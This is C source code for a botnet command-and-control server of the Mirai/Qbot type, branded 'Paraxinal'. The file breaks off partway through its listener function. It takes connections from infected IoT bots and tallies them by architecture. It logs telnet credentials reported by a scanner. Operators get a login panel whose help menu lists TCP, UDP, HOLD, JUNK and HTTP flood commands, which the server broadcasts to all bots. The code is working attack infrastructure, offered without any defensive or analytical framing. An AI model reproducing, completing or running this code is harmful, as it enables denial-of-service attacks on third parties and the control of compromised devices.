#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000
int ppc = 0;
int sh4 = 0;
int x86 = 0;
int armv4 = 0;
int armv5 = 0;
int armv6 = 0;
int armv7 = 0;
int mips = 0;
int m68k = 0;
int debug = 0;
int sparc = 0;
int mipsel = 0;
int boxes = 0;
int unknown = 0;
//////////////////////////////////
struct login_info {
	char username[20];
	char password[20];
};
static struct login_info accounts[20];
struct clientdata_t {
        uint32_t ip;
        char connected;
		char arch[50];
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
		char ip[16];
		char username[50];
		char userprompt[1024];
		int mute;
} managements[MAXFDS];
struct kekl {
        int sock;
		uint32_t ip;
        struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
char auresp[1024];
char new_username[40];
char new_password[40];
//////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;     
	hints.ai_socktype = SOCK_STREAM; 
    hints.ai_flags = AI_PASSIVE;   
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
const char *get_host(uint32_t addr)
{
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
		char kekolds[1024];
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected && managements[i].mute == 0)
                {
                        send(i, "\x1b[37m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                printf("sent to fd: %d\n", i);
                if(sendMGM && managements[i].mute == 0 || clients[i].connected) send(i, msg, strlen(msg), MSG_NOSIGNAL);
				snprintf(kekolds, sizeof(kekolds), "\r\n%s\x1b[36m> \x1b[0m", managements[i].username);
                if(sendMGM && managements[i].connected && managements[i].mute == 0) send(i, kekolds, strlen(kekolds), MSG_NOSIGNAL);
                else if(clients[i].connected) send(i, "\n", 1, MSG_NOSIGNAL);
        }
		memset(kekolds, 0, sizeof(kekolds));
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
				send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
                    else if(strstr(buf, "arch ") != NULL)
                    {
                        //char *arch = strtok(buf, " ")+sizeof(arch)-3;
                        char *arch = strstr(buf, "arch ") + 5;
                        strcpy(clients->arch, arch);
                        strcpy(clients[datafd].arch, arch);
                    }
						
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				memset(client[datafd].arch, 0, sizeof(client[datafd].arch));
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0;Devices: %d | Users Online: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
}}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}
void countArch()
{
    int x;
    ppc = 0;
    sh4 = 0;
    x86 = 0;
    armv4 = 0;
    armv5 = 0;
    armv6 = 0;
    armv7 = 0;
    mips = 0;
    m68k = 0;
    debug = 0;
    sparc = 0;
    mipsel = 0;
    boxes = 0;
    unknown = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(clients[x].arch, "ppc") && clients[x].connected == 1)
            ppc++;
        else if(strstr(clients[x].arch, "sh4") && clients[x].connected == 1)
            sh4++;
        else if(strstr(clients[x].arch, "x86") && clients[x].connected == 1)
            x86++;
        else if(strstr(clients[x].arch, "armv4") && clients[x].connected == 1)
            armv4++;
    	else if(strstr(clients[x].arch, "armv5") && clients[x].connected == 1)
            armv5++;
    	else if(strstr(clients[x].arch, "armv6") && clients[x].connected == 1)
            armv6++;
        else if(strstr(clients[x].arch, "armv7") && clients[x].connected == 1)
            armv7++;
        else if(strstr(clients[x].arch, "mpsl") || strstr(clients[x].arch, "mipsel") && clients[x].connected == 1)
            mipsel++;
        else if(strstr(clients[x].arch, "mips") && clients[x].connected == 1)
            mips++;
        else if(strstr(clients[x].arch, "m68k") && clients[x].connected == 1)
            m68k++;
        else if(strstr(clients[x].arch, "debug") && clients[x].connected == 1)
            debug++;
        else if(strstr(clients[x].arch, "sparc") && clients[x].connected == 1)
            sparc++;
        else if(strstr(clients[x].arch, "servers") || strstr(clients[x].arch, "boxes") || strstr(clients[x].arch, "box") && clients[x].connected == 1)
            boxes++;
        else if(strstr(clients[x].arch, "unknown") && clients[x].connected == 1 || clients[x].arch == NULL && clients[x].connected == 1 || strlen(clients[x].arch) <= 0 && clients[x].connected == 1)
            unknown++;
    }
}
void *BotWorker(void *sock) {
	struct kekl *args = sock;
	int datafd = (int)args->sock;
	const char *management_ip = get_host(args->ip);
	int find_line;
    OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}

        sprintf(botnet, "\e[31mUsername\e[97m: ");
		if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		snprintf(managements[datafd].username, sizeof(managements[datafd].username), "%s", buf);
		snprintf(managements[datafd].userprompt, sizeof(managements[datafd].userprompt), "\e[31m%s:\e[31m", managements[datafd].username);
		memset(buf, 0, sizeof(buf));
        sprintf(botnet, "\e[31mPassword\e[97m: \e[30m");
        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
        }
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char failed_line1[80];
		
		sprintf(failed_line1, "\e[105m            Invalid Login!        \r\n");
		if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, datafd);
		char ascii_banner_line1 [5000];
		char ascii_banner_line2 [5000];
		char ascii_banner_line3 [5000];
		char ascii_banner_line4 [5000];
		char ascii_banner_line5 [5000];
		char ascii_banner_line6 [5000];
		char ascii_banner_line7 [5000];                                                                
		char ascii_banner_line8 [5000];
		char ascii_banner_line9 [5000];

        sprintf(ascii_banner_line1, "\e[31m                                                                  \r\n");
		sprintf(ascii_banner_line2, "\e[31m                   ╔═╗ ╔═╗ ╦═╗ ╔═╗ ═╗ ╦ ╦ ╔╗╔ ╔═╗ ╦                   \r\n");
		sprintf(ascii_banner_line3, "\e[37m                   ╠═╝ ╠═╣ ╠╦╝ ╠═╣ ╔╩╦╝ ║ ║║║ ╠═╣ ║                   \r\n");
        sprintf(ascii_banner_line4, "\e[90m                   ╩   ╩ ╩ ╩╚═ ╩ ╩ ╩ ╚═ ╩ ╝╚╝ ╩ ╩ ╩═╝                 \r\n");                
        sprintf(ascii_banner_line5, "\e[31m               ╔═══════════════════════════════════════╗          \r\n");
        sprintf(ascii_banner_line6, "\e[31m               ║         [\e[37m+\e[31m]\e[37mHost: Paraxinal\e[31m[\e[37m+\e[31m]         ║          \r\n"); 
        sprintf(ascii_banner_line7, "\e[31m               ║         [\e[37m+\e[31m]\e[37mDDOSING FBI-CEO\e[31m[\e[37m+\e[31m]         ║          \r\n");                                                                                             
        sprintf(ascii_banner_line8, "\e[31m               ║         [\e[37m+\e[31m]\e[37mType ? For Help\e[31m[\e[37m+\e[31m]         ║          \r\n");     
        sprintf(ascii_banner_line9, "\e[31m               ╚═══════════════════════════════════════╝          \r\n");  

		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, managements[datafd].userprompt, strlen(managements[datafd].userprompt), MSG_NOSIGNAL) == -1) goto end;
        managements[datafd].connected = 1;
		managements[datafd].mute = 0; // 1 = muted | 0 = unmuted
		snprintf(managements[datafd].ip, sizeof(managements[datafd].ip), "%s", management_ip); // store our ip
		printf("\x1b[35m%s\x1b[31m:\x1b[36m%s\x1b[32m logged in\x1b[37m.\n", managements[datafd].username, managements[datafd].ip);
		FILE *client_logs;
		client_logs = fopen("clients.txt", "a");
		if(client_logs == NULL)
			client_logs = fopen("clients.txt", "w");
		fprintf(client_logs, "%s:%s\n", managements[datafd].username, managements[datafd].ip);
		fclose(client_logs);

		while(fdgets(buf, sizeof buf, datafd) > 0)
		{
			if(strstr(buf, "bots"))
			{
	            countArch();
	            if(BotsConnected() == 0)
	            {
	                sprintf(botnet, "\x1b[1;36musers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", OperatorsConnected);
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	            }
	            else
	            {
	                sprintf(botnet, "\x1b[1;36mUsers [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", OperatorsConnected);
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                if(ppc != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mpowerpc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", ppc);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(sh4 != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36msh4 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", sh4);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(x86 != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mx86 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", x86);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(armv4 != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36marmv4 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", armv4);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(armv5 != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36marmv5 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", armv5);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(armv6 != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36marmv6 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", armv6);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(armv7 != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36marmv7 [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", armv7);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(mips != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mmips [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", mips);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(m68k != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mm68k [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", m68k);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(debug != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mdebug [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", debug);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(sparc != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36msparc [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", sparc);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(mipsel != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mmipsel [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", mipsel);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(boxes != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36mservers [\x1b[90m%d\x1b[1;36m]\r\n\x1b[0m", boxes);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                if(unknown != 0)
	                {
	                    sprintf(botnet, "\x1b[1;36munknown [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", unknown);
	                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	                }
	                sprintf(botnet, "\x1b[1;36mTotal: [\x1b[0m%d\x1b[1;36m]\r\n\x1b[0m", BotsConnected());
	                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
			}
			else if(strstr(buf, "stat")){
				sprintf(statuscount, "TELNET DEVICES: %d  TELNET STATUS: %d\r\n", TELFound, scannerreport);
				if(send(datafd, statuscount, strlen(statuscount), MSG_NOSIGNAL) == -1) return;
			}
			else if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "?")) {
				char helpline1  [80];
				char helpline2  [80];
				char helpline3  [80];
				char helpline4  [80];
				char helpline5  [80];
				char helpline6  [80];
				char helpline7  [80];
				char helpline8  [80];
                char helpline9  [80];
				char helpline10  [80];
				
				
				sprintf(helpline1,   "\e[31m╔════════════════════════════════════════════════╗\r\n");
				sprintf(helpline2,   "\e[31m║TCP~ \e[37m!* TCP <IP> <PORT> <TIME> 32 all 0\e[31m         ║\r\n");
				sprintf(helpline3,   "\e[31m║UDP~ \e[37m!* UDP <IP> <PORT> <TIME> 32 0 10 \e[31m         ║\r\n");
				sprintf(helpline4,   "\e[31m║STD~ \e[37m!* STD <IP> <PORT> <TIME>         \e[31m         ║\r\n");
				sprintf(helpline5,   "\e[31m║HOLD~\e[37m!* HOLD <IP> <PORT> <TIME>        \e[31m         ║\r\n");   
				sprintf(helpline6,   "\e[31m║JUNK~\e[37m!* JUNK <IP> <PORT> <TIME>        \e[31m         ║\r\n");
				sprintf(helpline7,   "\e[31m║HTTP~\e[37m!* HTTP <URL> <TIME>              \e[31m         ║\r\n");
				sprintf(helpline8,   "\e[31m║KILL~\e[37m!* stop                           \e[31m         ║\r\n");
                sprintf(helpline9,   "\e[31m║Mute~\e[37m!* mute                           \e[31m         ║\r\n");
				sprintf(helpline10,  "\e[31m╚════════════════════════════════════════════════╝            \r\n");
				
				
				if(send(datafd, helpline1, strlen(helpline1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline2, strlen(helpline2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline3, strlen(helpline3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline4, strlen(helpline4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline5, strlen(helpline5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline6, strlen(helpline6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline7, strlen(helpline7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline8, strlen(helpline8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline9, strlen(helpline9), MSG_NOSIGNAL) == -1) goto end;
			    if(send(datafd, helpline10, strlen(helpline10), MSG_NOSIGNAL) == -1) goto end;
			}
            else if(strstr(buf, "!* unmute") || strstr(buf, "UNMUTE"))
            {
                if(managements[datafd].mute == 1)
                {
                    managements[datafd].mute = 0;
                    sprintf(botnet, "\x1b[32mMute Disabled!\x1b[37m\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    sprintf(botnet, "\x1b[31mError, Mute is Already Disabled.\x1b[37m\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            else if(strstr(buf, "!* mute") || strstr(buf, "!* MUTE"))
            {
                if(managements[datafd].mute == 0)
                {
                    managements[datafd].mute = 1;
                    sprintf(botnet, "\x1b[32mMute Enabled!\x1b[37m\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    sprintf(botnet, "\x1b[31mError, Mute is Already Enabled.\x1b[37m\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
			if(strstr(buf, "!* kill")) {
				char killattack [2048];
				memset(killattack, 0, 2048);
				sprintf(killattack, "Succesfully Stopped Attack!\r\n");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
			}
			else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
			{
				if(!strcmp(managements[datafd].username, "root")) // this means the function will only work for the username root
				{
					reuser:
					memset(auresp, 0, sizeof(auresp));
					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
					sprintf(auresp, "\x1b[39mEnter new unsername\x1b[35m: \x1b[37m");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
					while(fdgets(new_username, sizeof(new_username), datafd) > 0)
						break;
					trim(new_username);
					int ok;
					for(ok=0; ok < MAXFDS; ok++)
					{
						if(!strcmp(accounts[ok].username, new_username))
						{
							snprintf(auresp, sizeof(auresp), "\x1b[31mSorry\x1b[32m,\x1b[31mThe username (\x1b[33m%s\x1b[31m) is taken already\x1b[37m...\r\n", new_username);
							if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
							memset(new_username, 0, sizeof(new_username));
							goto reuser;
						}
					}
					memset(auresp, 0, sizeof(auresp));
					sprintf(auresp, "\x1b[39mEnter new password\x1b[35m: \x1b[37m");
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
					while(fdgets(new_password, sizeof(new_password), datafd) > 0)
						break;
					trim(new_password);;
					FILE *auf = fopen("login.txt", "a");
					fprintf(auf, "%s %s\n", new_username, new_password);
					fclose(auf);
					snprintf(auresp, sizeof(auresp), "\x1b[39mAccount \x1b[33m%s\x1b[39m added\x1b[32m!\x1b[37m\r\n", new_username);
					if(send(datafd, auresp, strlen(auresp), MSG_NOSIGNAL) == -1) goto end;
					memset(auresp, 0, sizeof(auresp));
					memset(new_username, 0, sizeof(new_username));
					memset(new_password, 0, sizeof(new_password));
				}
				else
				{
					char failed_msg[150];
					snprintf(failed_msg, sizeof(failed_msg), "Sorry %s, only the owner can use this function...\r\n", managements[datafd].username);
					if(send(datafd, failed_msg, strlen(failed_msg), MSG_NOSIGNAL) == -1) return;
					memset(failed_msg, 0, sizeof(failed_msg));
				}
			}
			else if(strstr(buf, "kick "))
			{
				if(!strcmp(managements[datafd].username, "root")) // this means the function will only work for the username root
				{
					trim(buf);
					char *nick = buf+5;
					int x;
					for(x=0; x < MAXFDS; x++)
					{
						if(!strcmp(managements[x].username, nick))
						{
							char kick_msg[200];
							char kick_msg2[200];
							snprintf(kick_msg, sizeof(kick_msg), "\r\n\x1b[37m%s\x1b[37m you have been kicked by \x1b[37m%s\x1b[37m, Goodbye.\x1b[95m\r\n", managements[x].username, managements[datafd].username);
							snprintf(kick_msg2, sizeof(kick_msg2), "\x1b[37mYou kicked \x1b[37m%s\x1b[37m...\r\n", managements[x].username);
							if(send(datafd, kick_msg2, strlen(kick_msg2), MSG_NOSIGNAL) == -1) return;
							if(send(x, kick_msg, strlen(kick_msg), MSG_NOSIGNAL) == -1) return;
							managements[x].connected = 0;
							close(x);
							memset(managements[x].username, 0, sizeof(managements[x].username));
							memset(kick_msg, 0, sizeof(kick_msg));
							memset(kick_msg2, 0, sizeof(kick_msg2));
						}
					}
				}
				else
				{
					char failed_msg[150];
					snprintf(failed_msg, sizeof(failed_msg), "Sorry %s, only the owner can use this function...\r\n", managements[datafd].username);
					if(send(datafd, failed_msg, strlen(failed_msg), MSG_NOSIGNAL) == -1) return;
					memset(failed_msg, 0, sizeof(failed_msg));
				}
				memset(buf, 0, sizeof(buf));
			}
			else if(strstr(buf, "CLEARSCREEN") || strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
			}
			if(strstr(buf, "log")) {
				char logoutmessage [2048];
				memset(logoutmessage, 0, 2048);
				sprintf(logoutmessage, "Redirecting..., %s", accounts[find_line].username);
				if(send(datafd, logoutmessage, strlen(logoutmessage), MSG_NOSIGNAL) == -1)goto end;
				sleep(5);
				goto end;
			}
                trim(buf);
                if(send(datafd, managements[datafd].userprompt, strlen(managements[datafd].userprompt), MSG_NOSIGNAL) == -1) goto end;
				broadcast(buf, datafd, managements[datafd].username);
                printf("%s: \"%s\"\n", managements[datafd].username, buf);

				FILE *LogFile;
                LogFile = fopen("server_log.txt", "a");
				time_t now;
				struct tm *gmt;
				char formatted_gmt [50];
				char lcltime[50];
				now = time(NULL);
				gmt = gmtime(&now);
				strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, managements[datafd].username, buf);
                fclose(LogFile);
                memset(buf, 0, sizeof(buf));
        }
		end:
			managements[datafd].connected = 0;
			close(datafd);
			OperatorsConnected--;
			memset(managements[datafd].username, 0, sizeof(managements[datafd].username));
			memset(buf, 0, sizeof(buf));
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
